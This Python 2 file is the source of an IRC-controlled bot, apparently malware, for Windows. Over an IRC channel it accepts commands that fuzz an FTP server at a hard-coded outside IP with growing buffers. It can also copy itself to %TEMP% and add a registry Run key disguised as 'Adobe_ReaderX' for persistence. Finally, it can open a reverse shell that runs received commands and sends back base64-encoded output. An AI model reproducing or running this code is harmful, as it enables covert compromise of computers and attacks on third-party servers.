import subprocess, sys, base64, os, socket
from _winreg import *
from time import sleep

def ircConnect():
    network = 'irc.freenode.net'
    port = 6667
    nick = 'doshBot'
    channel = '#doshchannel'

    irc = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    irc.connect( (network, port) )
    print irc.recv( 4096 )
    irc.send("USER " + nick + " " + nick + " " + nick + " :This is a test\n")
    irc.send("NICK " + nick + "\n")
    irc.send("JOIN " + channel + '\n')

    while 1:
        text = irc.recv(2040)
        print text
        #time.sleep(5)
        if(text.find('PING') != -1):
            irc.send('PONG ' + text.split()[1] + '\r\n')

        if(text.find(':!speak') != -1):
            irc.send('PRIVMSG ' + channel + ' :What up' + '\r\n')

        if(text.find(':!echo') != -1):
            echo()

        if(text.find(':!ping') != -1):
            ping()

        if(text.find(':!fuzz') != -1):
            fuzz()

        if(text.find(':!switch') != -1):
            switch()




def echo():
    subprocess.call(['echo', 'hello'])

def ping():
    subprocess.call(['ping', '127.0.0.1'])

def fuzz():
    buffer = '\x41'*50
    target = '129.21.134.17'
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, 21))
            s.recv(1024)

            print "Sending buffer with length: " + str(len(buffer)-50)
            s.send("USER " + buffer + "\r\n")
            s.close()
            sleep(1)
            buffer = buffer + '\x41'*50

        except:
            print "Crash occured with buffer length: " + str(len(buffer) - 50)
            return 0

def autorun(tempdir, fileName, run):
# Copy executable to %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))

# Queries Windows registry for the autorun key value
# Stores the key values in runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

# If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
            key.Close()
        except WindowsError:
            pass

def shell():
#Base64 encoded reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', int(443)))
    s.send('[*] Connection Established!')
    while 1:
        data = s.recv(1024)
        if data == "quit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        encoded = base64.b64encode(stdout_value)
        s.send(encoded)
        #s.send(stdout_value)
    s.close()

def switch():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir, fileName, run)
    shell()

if __name__ == '__main__':
    ircConnect()
